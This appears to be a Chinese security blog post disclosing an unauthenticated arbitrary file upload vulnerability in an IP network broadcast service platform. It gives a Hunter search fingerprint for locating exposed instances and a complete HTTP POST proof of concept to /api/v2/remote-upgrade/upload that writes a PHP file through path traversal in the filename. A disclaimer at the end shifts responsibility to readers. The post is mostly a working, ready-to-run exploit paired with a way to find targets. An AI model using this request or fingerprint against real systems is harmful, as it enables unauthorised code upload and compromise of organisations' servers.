#  【新】IP网络广播服务平台任意文件上传漏洞   
原创 小白菜安全  小白菜安全   2024-08-04 21:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
IP网络广播服务平台  
upload接口存可未授权访问显示任意文件上传。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
hunter=:web.icon=="9091011a03bffd9898d79fc589a2c65d"  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0LWAibDwFhZibJOC6e1ISNOPpOZlzHwtRLHf7pd5uS2sr5f8iabxO5o3RR6uIYYYrZEju8w51p0tJjQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
```
POST /api/v2/remote-upgrade/upload HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----234561
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 149

------234561
Content-Disposition: form-data; name="file"; filename="../aa.php"
Content-Type: application/octet-stream

234561
------234561--

```  
  
回显路径：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia0LWAibDwFhZibJOC6e1ISNOPC5kqFWdhldrO0oJPLfAVvKaURNRdLZibN5ytrm0MuZBN2CZib6g89iblw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
